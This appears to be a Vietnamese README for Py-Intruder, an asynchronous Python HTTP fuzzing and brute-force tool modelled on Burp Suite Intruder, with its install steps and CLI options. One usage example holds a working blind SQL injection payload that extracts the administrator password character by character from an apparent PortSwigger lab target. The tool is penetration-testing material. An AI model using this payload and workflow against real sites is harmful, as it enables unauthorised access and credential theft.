# Py-Intruder

Công cụ kiểm thử xâm nhập HTTP bất đồng bộ hiệu năng cao viết bằng Python, được thiết kế để thay thế cho tính năng Burp Suite Intruder (bản Community vốn giới hạn tốc độ). 

Công cụ sử dụng thư viện `httpx` và cơ chế `asyncio` để tối ưu hóa việc gửi yêu cầu đồng thời (concurrency), giúp tăng tốc độ quét lỗ hổng bảo mật, brute-force hoặc fuzzing đường dẫn web.

## Tính năng nổi bật
* **Tốc độ vượt trội**: Tận dụng tối đa sức mạnh của xử lý bất đồng bộ (Asynchronous I/O) giúp hoàn thành hàng nghìn request chỉ trong vài giây.
* **Kiểm soát luồng thông minh**: Hỗ trợ cơ chế Semaphore giới hạn số lượng request song song (Workers) để tránh quá tải hệ thống đích hoặc gây nghẽn băng thông.
* **Chế độ tấn công rõ ràng**: Hỗ trợ thiết lập chế độ --sniper hoặc --cb (Cluster Bomb) linh hoạt.
* **Tự sinh Payload thông minh**: Hỗ trợ sinh nhanh các dải số (range:1-20) hoặc tự động tạo danh sách ký tự (a-z, 0-9) mà không cần nạp file wordlist thủ công.

## Yêu cầu hệ thống
* Python 3.8 trở lên
* Thư viện `httpx`

## Cài đặt

1. Clone dự án về máy:
```bash
git clone https://github.com/<your-username>/py-intruder.git
cd py-intruder
```

2. Cài đặt các thư viện phụ thuộc:
```bash
pip install -r requirements.txt
```

## Hướng dẫn sử dụng

Chạy chương trình thông qua giao diện dòng lệnh (CLI):

### Các tham số cấu hình chính:
* `-u`, `--url`: URL mục tiêu cần kiểm tra. Chứa ký tự `§§` đối với chế độ Sniper, hoặc chứa đồng thời `§1§` và `§2§` đối với chế độ Cluster Bomb.
* `--sniper`: Ép buộc sử dụng chế độ Sniper.
* `--cb`: Ép buộc sử dụng chế độ Cluster Bomb.
* `-f`, `--wordlist`: File wordlist thứ nhất (hoặc sử dụng cú pháp tự sinh dãy số `range:X-Y`).
* `-f2`, `--wordlist2`: File wordlist thứ hai (chỉ dùng cho Cluster Bomb).
* `-az`: Tự động tạo danh sách chữ cái thường (`a-z`) làm danh sách payload.
* `-09`: Tự động tạo danh sách chữ số (`0-9`) làm danh sách payload.
* `-c`, `--workers`: Số lượng request gửi đi song song tại một thời điểm (Mặc định: 10).

---

### Ví dụ thực tế:

#### 1. Chạy chế độ Sniper (Fuzz tên thư mục tự sinh từ a-z):
```bash
python intruder.py --sniper -u "https://example.com/§§" -az -c 20
```

#### 2. Chạy chế độ Cluster Bomb (Giải quyết bài toán dò mật khẩu 20 ký tự trong Blind SQL Injection):
* Vị trí `§1§` sẽ tự động sinh số từ 1 đến 20 nhờ `range:1-20`.
* Vị trí `§2§` sẽ tự sinh danh sách chứa chữ cái thường và số từ cờ `-az` và `-09`.
```bash
python intruder.py --cb -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Gifts&tracking=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§2§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" -f range:1-20 -az -09 -c 50
```

## Định dạng đầu ra (Output)
Chương trình hiển thị trực tiếp kết quả phản hồi của từng request trên console. 

Đặc biệt, ở chế độ Cluster Bomb, sau khi hoàn thành quá trình quét, chương trình sẽ tự động in ra bảng tổng hợp tất cả các vị trí trùng khớp có Status Code `500` (giúp bạn đọc ra chuỗi mật khẩu chính xác một cách nhanh chóng).
